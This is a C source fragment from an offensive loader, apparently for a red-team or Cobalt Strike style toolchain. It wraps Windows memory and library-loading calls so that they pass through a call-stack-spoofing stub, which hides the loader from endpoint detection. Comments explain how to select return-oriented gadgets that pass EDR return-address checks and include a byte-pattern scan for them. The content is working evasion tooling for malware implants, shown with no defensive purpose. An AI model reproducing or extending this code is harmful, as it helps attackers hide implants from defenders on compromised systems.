/*
 * Hook Wrappers — Crystal Palace Link-Time Function Hooking
 *
 * The loader is authored with unmodified Windows API calls. Evasion
 * techniques (call stack spoofing, syscalls) are substituted at link
 * time via the "attach" directive in the spec file:
 *
 *   attach "KERNEL32$VirtualAlloc"   "_VirtualAlloc"
 *   attach "KERNEL32$VirtualProtect" "_VirtualProtect"
 *   attach "KERNEL32$LoadLibraryA"   "_LoadLibraryA"
 *
 * Each hook wrapper proxies the real call through spoof_call(),
 * which routes through the Draugr call stack spoofing stub.
 */

#include <windows.h>

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);

LPVOID WINAPI _VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAlloc, DWORD flProt) {
    FUNCTION_CALL call = {0};
    call.function = (PVOID)(KERNEL32$VirtualAlloc);
    call.argc     = 4;
    call.args[0]  = (ULONG_PTR)lpAddress;
    call.args[1]  = (ULONG_PTR)dwSize;
    call.args[2]  = (ULONG_PTR)flAlloc;
    call.args[3]  = (ULONG_PTR)flProt;
    return (LPVOID)spoof_call(&call);   // proxied through Draugr / gadget frame
}

/*
 * Gadget Selection:
 *
 * Call stack spoofing requires a jmp qword ptr [rbx] gadget (or rdi/rsi
 * equivalent) located within a loaded module. The gadget must be preceded
 * by a call instruction; sensors that verify the instruction immediately
 * preceding each return address treat gadgets lacking a preceding call
 * as anomalous.
 *
 * A survey of Windows 11 24H2 System32 DLLs identified 13 rbx, 8 rdi,
 * and 3 rsi gadgets meeting these criteria.
 *
 * Example gadget search pattern:
 *   if (bytes[i] == 0xFF && bytes[i+1] == 0x23 && bytes[i-5] == 0xE8) {
 *       gadgets[count++] = &bytes[i];   // jmp qword ptr [rbx]
 *   }
 */
